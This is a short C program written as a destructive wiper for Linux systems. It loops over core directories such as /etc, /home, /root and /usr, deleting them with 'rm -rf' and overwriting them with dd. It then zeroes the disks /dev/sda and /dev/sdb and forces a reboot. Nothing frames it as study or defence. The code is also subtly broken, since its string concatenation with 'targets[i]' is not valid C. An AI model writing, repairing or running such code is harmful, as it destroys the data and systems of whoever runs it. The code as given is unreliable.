#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Target system directories and files
const char* targets[] = {
    "/bin",
    "/boot",
    "/dev",
    "/etc",
    "/home",
    "/lib",
    "/lib64",
    "/proc",
    "/root",
    "/sbin",
    "/sys",
    "/usr",
    "/var"
};

int main() {
    // Iterate through target directories and files
    for (int i = 0; i < sizeof(targets) / sizeof(targets[0]); i++) {
        // Attempt to delete directory contents
        system("rm -rf " targets[i]);
        
        // Attempt to overwrite and delete files
        system("dd if=/dev/zero of=" targets[i] "/*");
        system("rm -f " targets[i] "/*");
    }
    
    // Attempt to corrupt system partitions
    system("dd if=/dev/zero of=/dev/sda");
    system("dd if=/dev/zero of=/dev/sdb");
    
    // Force system reboot
    system("reboot -f");
    
    return 0;
}
